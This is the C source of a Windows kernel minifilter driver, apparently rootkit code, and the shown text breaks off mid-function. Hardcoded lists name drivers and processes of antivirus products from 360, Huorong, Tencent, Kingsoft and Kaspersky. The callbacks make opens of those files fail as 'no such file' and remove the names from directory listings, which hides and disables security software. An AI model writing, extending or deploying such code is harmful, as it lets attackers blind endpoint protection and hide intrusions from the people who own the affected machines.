// =========================================================================================
//       Filesystem Minifilter
// =========================================================================================
#include <ntifs.h>
#include <windef.h>
#include <stdio.h>
#include <fltKernel.h>
#include "ExcludeList.h"
#include "FsFilter.h"
#include "Helper.h"
#include "PsMonitor.h"
#include "Driver.h"
#include "Configs.h"

#define FSFILTER_ALLOC_TAG 'DHlF'

NTSTATUS FilterSetup(PCFLT_RELATED_OBJECTS FltObjects, FLT_INSTANCE_SETUP_FLAGS Flags, DEVICE_TYPE VolumeDeviceType, FLT_FILESYSTEM_TYPE VolumeFilesystemType);

FLT_PREOP_CALLBACK_STATUS FltCreatePreOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID *CompletionContext);
//FLT_POSTOP_CALLBACK_STATUS FltCreatePostOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags);
FLT_PREOP_CALLBACK_STATUS FltDirCtrlPreOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID *CompletionContext);
FLT_POSTOP_CALLBACK_STATUS FltDirCtrlPostOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags);

NTSTATUS CleanFileFullDirectoryInformation(PFILE_FULL_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName);
NTSTATUS CleanFileBothDirectoryInformation(PFILE_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName);
NTSTATUS CleanFileDirectoryInformation(PFILE_DIRECTORY_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName);
NTSTATUS CleanFileIdFullDirectoryInformation(PFILE_ID_FULL_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName);
NTSTATUS CleanFileIdBothDirectoryInformation(PFILE_ID_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName);
NTSTATUS CleanFileNamesInformation(PFILE_NAMES_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName);


const FLT_CONTEXT_REGISTRATION Contexts[] = {
	{ FLT_CONTEXT_END }
};

CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
	{ IRP_MJ_CREATE, 0, FltCreatePreOperation,  /*FltCreatePostOperation*/ NULL },
	{ IRP_MJ_DIRECTORY_CONTROL, 0, FltDirCtrlPreOperation, FltDirCtrlPostOperation },
	{ IRP_MJ_OPERATION_END }
};

CONST FLT_REGISTRATION FilterRegistration = {
	sizeof(FLT_REGISTRATION), //  Size
	FLT_REGISTRATION_VERSION, //  Version
	FLTFL_REGISTRATION_DO_NOT_SUPPORT_SERVICE_STOP,                        //  Flags
	Contexts,                 //  Context
	Callbacks,                //  Operation callbacks
	/*FilterUnload*/NULL,     //  MiniFilterUnload
	FilterSetup,              //  InstanceSetup
	NULL,                     //  InstanceQueryTeardown
	NULL,                     //  InstanceTeardownStart
	NULL,                     //  InstanceTeardownComplete
	NULL,                     //  GenerateFileName
	NULL,                     //  GenerateDestinationFileName
	NULL                      //  NormalizeNameComponent
};

BOOLEAN g_fsMonitorInited = FALSE;
PFLT_FILTER gFilterHandle = NULL;

ExcludeContext g_excludeFileContext;
ExcludeContext g_excludeDirectoryContext;
ExcludeContext g_excludeFilecompriseContext;
// Use this variable for hard code full file paths that you would like to hide
// For instance: L"\\Device\\HarddiskVolume1\\Windows\\System32\\calc.exe"
// Notice: this array should be NULL terminated
CONST PWCHAR g_excludeFiles[] = {

	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\DsArk64.sys",//360
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360AntiSteal64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360FsFlt.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360netmon.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360AntiAttack64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360AntiHijack64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360AntiExploit64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360AntiHacker64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\BAPIDRV64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360reskit64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360qpesv64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360Sensor64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360Box64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\360Box64.sys",
	//L"\\Device\\HarddiskVolume1\\Program Files (x86)\\360\\360Safe\\deepscan\\AtS64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\sysdiag_win10.sys", //火绒
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\hrwfpdrv_win10.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\sysdiag.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\hrwfpdrv.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\hrdevmon.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\hrdevmon_win10.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\nxeng.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\TAOAcceleratorEx64_ev.sys", //QQ
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\TAOAccelerator64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\qmbsecx64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\TFsFltX64_ev.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\TAOKernel64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\ksapi64.sys", //金山
	//L"\\Device\\HarddiskVolume1\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\kxescan\\kdhacker64_ev.sys",
	//L"\\Device\\HarddiskVolume1\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\kxescan\\kdhacker64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\kavbootc64_ev.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\KAVBootC64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\kisknl.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\bootsafe64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\ksthlp64.sys",
	//L"\\Device\\HarddiskVolume1\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\ksde\\kisnetflt64.sys",
	//L"\\Device\\HarddiskVolume1\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\ksnetm\\kisnetm64.sys",
	//L"\\Device\\HarddiskVolume1\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\khwinfo64.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klgse.sys",//卡巴
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klhk.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klflt.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klif.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klwtp.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klim6.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klkbdflt2.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\cm_km.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\kldisk.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klwfp.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\kneps.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klpd.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klupd_klif_arkmon.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klupd_klif_klbg.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klbackupdisk.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klupd_klif_klark.sys",
	//L"\\Device\\HarddiskVolume1\\Windows\\System32\\drivers\\klupd_klif_mark.sys",
	//L"\\Device\\HarddiskVolume1\\ProgramData\\Kaspersky Lab\\AVP21.3\\Bases\\klids.sys",

	NULL
};

// Use this variable for hard code full directory paths that you would like to hide
// For instance: L"\\Device\\HarddiskVolume1\\Windows\\System32\\mysecretdir"
// Notice: this array should be NULL terminated
CONST PWCHAR g_excludeDirs[] = {
	NULL
};

// Use this variable for hard code full directory paths that you would like to hide

CONST PWCHAR g_excludefilecomprise[] = {
	L"DsArk64.sys",//360
	L"360AntiSteal64.sys",
	L"360FsFlt.sys",
	L"360netmon.sys",
	L"360AntiAttack64.sys",
	L"360AntiHijack64.sys",
	L"360AntiExploit64.sys",
	L"360AntiHacker64.sys",
	L"BAPIDRV64.sys",
	L"360reskit64.sys",
	L"360qpesv64.sys",
	L"360Sensor64.sys",
	L"360Box64.sys",
	L"360Box64.sys",
	L"AtS64.sys",
	L"360tray.exe",//360进程
	L"360leakfixer.exe",
	L"ZhuDongFangYu.exe",
	L"deepscan",	
	L"sysdiag_win10.sys", //火绒
	L"hrwfpdrv_win10.sys",
	L"sysdiag.sys",
	L"hrwfpdrv.sys",
	L"hrdevmon.sys",
	L"hrdevmon_win10.sys",
	L"nxeng.sys",
	L"HipsDaemon",
	L"TAOAcceleratorEx64_ev.sys", //QQ
	L"TAOAccelerator64.sys",
	L"qmbsecx64.sys",
	L"TFsFltX64_ev.sys",//C:\Program Files (x86)\Tencent\QQPCMgr\16.6.24254.216    QQ
	L"TAOKernel64.sys",
	L"QMUdisk64_ev.sys",
	L"TSSysKit64_EV.sys",
	L"QQSysMonX64_EV.sys",
	L"TsNetHlpX64_ev.sys",
	L"qmudisk64_ev.sys",
	L"ksapi64.sys", //金山
	L"kdhacker64_ev.sys",
	L"kdhacker64.sys",
	L"kavbootc64_ev.sys",
	L"KAVBootC64.sys",
	L"kisknl.sys",
	L"bootsafe64.sys",
	L"ksthlp64.sys",
	L"kisnetflt64.sys",
	L"kisnetm64.sys",
	L"khwinfo64.sys",
	L"klgse.sys",//卡巴
	L"klhk.sys",
	L"klflt.sys",
	L"klif.sys",
	L"klwtp.sys",
	L"klim6.sys",
	L"klkbdflt2.sys",
	L"cm_km.sys",
	L"kldisk.sys",
	L"klwfp.sys",
	L"kneps.sys",
	L"klpd.sys",
	L"klupd_klif_arkmon.sys",
	L"klupd_klif_klbg.sys",
	L"klbackupdisk.sys",
	L"klupd_klif_klark.sys",
	L"klupd_klif_mark.sys",
	L"klids.sys",
	L"kernelquick",
	NULL
};

NTSTATUS FilterSetup(PCFLT_RELATED_OBJECTS FltObjects, FLT_INSTANCE_SETUP_FLAGS Flags, DEVICE_TYPE VolumeDeviceType, FLT_FILESYSTEM_TYPE VolumeFilesystemType)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(Flags);
	UNREFERENCED_PARAMETER(VolumeDeviceType);
	UNREFERENCED_PARAMETER(VolumeFilesystemType);

	LogTrace("Attach to a new device (flags:%x, device:%d, fs:%d)", (ULONG)Flags, (ULONG)VolumeDeviceType, (ULONG)VolumeFilesystemType);

	return STATUS_SUCCESS;
}

enum {
	FoundExcludeFile = 1,
	FoundExcludeDir = 2,
};

FLT_PREOP_CALLBACK_STATUS FltCreatePreOperation(
	_Inout_ PFLT_CALLBACK_DATA Data,
	_In_ PCFLT_RELATED_OBJECTS FltObjects,
	_Flt_CompletionContext_Outptr_ PVOID *CompletionContext)
{
	UINT32 disposition, options;
	PFLT_FILE_NAME_INFORMATION fltName;
	NTSTATUS status;
	BOOLEAN neededPrevent = FALSE;

	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);

	if (!IsDriverEnabled())
		return FLT_PREOP_SUCCESS_NO_CALLBACK;

	LogInfo("%wZ (options:%x)", &Data->Iopb->TargetFileObject->FileName, Data->Iopb->Parameters.Create.Options);

	if (IsProcessExcluded(PsGetCurrentProcessId()))
		return FLT_PREOP_SUCCESS_NO_CALLBACK;

	options = Data->Iopb->Parameters.Create.Options & 0x00FFFFFF;
	disposition = (Data->Iopb->Parameters.Create.Options & 0xFF000000) >> 24;

	status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &fltName);
	if (!NT_SUCCESS(status))
	{
		if (status != STATUS_OBJECT_PATH_NOT_FOUND)
			LogWarning("FltGetFileNameInformation() failed with code:%08x", status);

		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	if (!(options & FILE_DIRECTORY_FILE))
	{
		// If it is create file event
		if (CheckExcludeListDirectory(g_excludeFileContext, &fltName->Name))
			neededPrevent = TRUE;
	}

	// If it is create directory/file event
	if (!neededPrevent && CheckExcludeListDirectory(g_excludeDirectoryContext, &fltName->Name))
		neededPrevent = TRUE;

	FltReleaseFileNameInformation(fltName);

	if (neededPrevent)
	{
		LogTrace("Operation has been cancelled for: %wZ", &Data->Iopb->TargetFileObject->FileName);
		Data->IoStatus.Status = STATUS_NO_SUCH_FILE;
		return FLT_PREOP_COMPLETE;
	}

	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS FltDirCtrlPreOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID *CompletionContext)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	
	if (!IsDriverEnabled())
		return FLT_PREOP_SUCCESS_NO_CALLBACK;

	LogInfo("%wZ", &Data->Iopb->TargetFileObject->FileName);

	if (Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY)
		return FLT_PREOP_SUCCESS_NO_CALLBACK;

	switch (Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass)
	{
	case FileIdFullDirectoryInformation:
	case FileIdBothDirectoryInformation:
	case FileBothDirectoryInformation:
	case FileDirectoryInformation:
	case FileFullDirectoryInformation:
	case FileNamesInformation:
		break;
	default:
		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}

	return FLT_PREOP_SUCCESS_WITH_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS FltDirCtrlPostOperation(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
	PFLT_PARAMETERS params = &Data->Iopb->Parameters;
	PFLT_FILE_NAME_INFORMATION fltName;
	NTSTATUS status;

	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	UNREFERENCED_PARAMETER(Flags);

	if (!IsDriverEnabled())
		return FLT_POSTOP_FINISHED_PROCESSING;

	if (!NT_SUCCESS(Data->IoStatus.Status))
		return FLT_POSTOP_FINISHED_PROCESSING;

	LogInfo("%wZ", &Data->Iopb->TargetFileObject->FileName);

	if (IsProcessExcluded(PsGetCurrentProcessId()))
	{
		LogTrace("Operation is skipped for excluded process");
		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &fltName);
	if (!NT_SUCCESS(status))
	{
		LogWarning("FltGetFileNameInformation() failed with code:%08x", status);
		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	__try
	{
		status = STATUS_SUCCESS;

		switch (params->DirectoryControl.QueryDirectory.FileInformationClass)
		{
		case FileFullDirectoryInformation:
			status = CleanFileFullDirectoryInformation((PFILE_FULL_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
			break;
		case FileBothDirectoryInformation:
			status = CleanFileBothDirectoryInformation((PFILE_BOTH_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
			break;
		case FileDirectoryInformation:
			status = CleanFileDirectoryInformation((PFILE_DIRECTORY_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
			break;
		case FileIdFullDirectoryInformation:
			status = CleanFileIdFullDirectoryInformation((PFILE_ID_FULL_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
			break;
		case FileIdBothDirectoryInformation:
			status = CleanFileIdBothDirectoryInformation((PFILE_ID_BOTH_DIR_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
			break;
		case FileNamesInformation:
			status = CleanFileNamesInformation((PFILE_NAMES_INFORMATION)params->DirectoryControl.QueryDirectory.DirectoryBuffer, fltName);
			break;
		}

		Data->IoStatus.Status = status;
	}
	__finally
	{
		FltReleaseFileNameInformation(fltName);
	}

	return FLT_POSTOP_FINISHED_PROCESSING;
}

NTSTATUS CleanFileFullDirectoryInformation(PFILE_FULL_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
	PFILE_FULL_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		fileName.Buffer = info->FileName;
		fileName.Length = (USHORT)info->FileNameLength;
		fileName.MaximumLength = (USHORT)info->FileNameLength;

		if (info->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			matched = CheckExcludeListDirFile(g_excludeDirectoryContext, &fltName->Name, &fileName);
		else
			matched = CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName);

		if (CheckExcludeListDirFilecomprise(g_excludeFilecompriseContext, &fltName->Name, &fileName))
			matched = TRUE;

		

		if (matched)
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_FULL_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			LogTrace("Removed from query: %wZ\\%wZ", &fltName->Name, &fileName);

			if (retn)
				return status;

			info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileBothDirectoryInformation(PFILE_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
	PFILE_BOTH_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		fileName.Buffer = info->FileName;
		fileName.Length = (USHORT)info->FileNameLength;
		fileName.MaximumLength = (USHORT)info->FileNameLength;

		if (info->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			matched = CheckExcludeListDirFile(g_excludeDirectoryContext, &fltName->Name, &fileName);
		else
			matched = CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName);

		if (CheckExcludeListDirFilecomprise(g_excludeFilecompriseContext, &fltName->Name, &fileName))
			matched = TRUE;

		if (matched)
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_BOTH_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			LogTrace("Removed from query: %wZ\\%wZ", &fltName->Name, &fileName);

			if (retn)
				return status;

			info = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileDirectoryInformation(PFILE_DIRECTORY_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
	PFILE_DIRECTORY_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		fileName.Buffer = info->FileName;
		fileName.Length = (USHORT)info->FileNameLength;
		fileName.MaximumLength = (USHORT)info->FileNameLength;

		if (info->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			matched = CheckExcludeListDirFile(g_excludeDirectoryContext, &fltName->Name, &fileName);
		else
			matched = CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName);

		if (CheckExcludeListDirFilecomprise(g_excludeFilecompriseContext, &fltName->Name, &fileName))
			matched = TRUE;

		if (matched)
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_DIRECTORY_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			LogTrace("Removed from query: %wZ\\%wZ", &fltName->Name, &fileName);

			if (retn)
				return status;

			info = (PFILE_DIRECTORY_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_DIRECTORY_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileIdFullDirectoryInformation(PFILE_ID_FULL_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
	PFILE_ID_FULL_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		fileName.Buffer = info->FileName;
		fileName.Length = (USHORT)info->FileNameLength;
		fileName.MaximumLength = (USHORT)info->FileNameLength;

		if (info->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			matched = CheckExcludeListDirFile(g_excludeDirectoryContext, &fltName->Name, &fileName);
		else
			matched = CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName);
	

		if (CheckExcludeListDirFilecomprise(g_excludeFilecompriseContext, &fltName->Name, &fileName))
			matched = TRUE;

		if (matched)
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_ID_FULL_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_ID_FULL_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			LogTrace("Removed from query: %wZ\\%wZ", &fltName->Name, &fileName);

			if (retn)
				return status;

			info = (PFILE_ID_FULL_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_ID_FULL_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}

NTSTATUS CleanFileIdBothDirectoryInformation(PFILE_ID_BOTH_DIR_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
	PFILE_ID_BOTH_DIR_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING fileName;
	UINT32 offset, moveLength;
	BOOLEAN matched, search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		fileName.Buffer = info->FileName;
		fileName.Length = (USHORT)info->FileNameLength;
		fileName.MaximumLength = (USHORT)info->FileNameLength;

		if (info->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			matched = CheckExcludeListDirFile(g_excludeDirectoryContext, &fltName->Name, &fileName);
		else
			matched = CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName);

		if (CheckExcludeListDirFilecomprise(g_excludeFilecompriseContext, &fltName->Name, &fileName))
			matched = TRUE;

		if (matched)
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_ID_BOTH_DIR_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_ID_BOTH_DIR_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			LogTrace("Removed from query: %wZ\\%wZ", &fltName->Name, &fileName);

			if (retn)
				return status;

			info = (PFILE_ID_BOTH_DIR_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_ID_BOTH_DIR_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return status;
}

NTSTATUS CleanFileNamesInformation(PFILE_NAMES_INFORMATION info, PFLT_FILE_NAME_INFORMATION fltName)
{
	PFILE_NAMES_INFORMATION nextInfo, prevInfo = NULL;
	UNICODE_STRING fileName;
